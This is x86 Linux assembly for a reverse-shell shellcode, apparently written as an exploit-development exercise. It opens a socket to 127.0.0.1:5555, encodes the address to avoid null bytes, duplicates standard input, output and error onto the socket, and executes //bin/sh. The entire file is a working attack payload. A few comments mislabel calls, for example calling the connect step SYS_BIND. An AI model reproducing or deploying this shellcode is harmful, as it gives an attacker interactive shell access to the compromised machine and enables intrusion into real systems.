global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 1) Socket Creation

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI

; Address struct
push edx		; NULL Padding
push edx		; NULL Padding

xor eax, eax        ; Zero out EAX
; The return address 127.0.0.1 contains null-bytes which would break our shellcode. 
; We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2.

mov eax, 0x02010180     ; 2.1.1.128 (*Little-Endian)
sub eax, 0x01010101     ; Subtract 1.1.1.1 
push eax        ; sin_addr = 127.0.0.1
push word 0xb315		; port = 5555 (*Little-Endian)
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI

; 2) Connect

xor eax, eax
xor ebx, ebx
mov al, 0x66		; socketcall = 102
mov bl, 0x3		; #define SYS_CONNECT	3
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND

; 3) Dup2 - Input and Output Redriection

xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag

; 4) Execve

push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
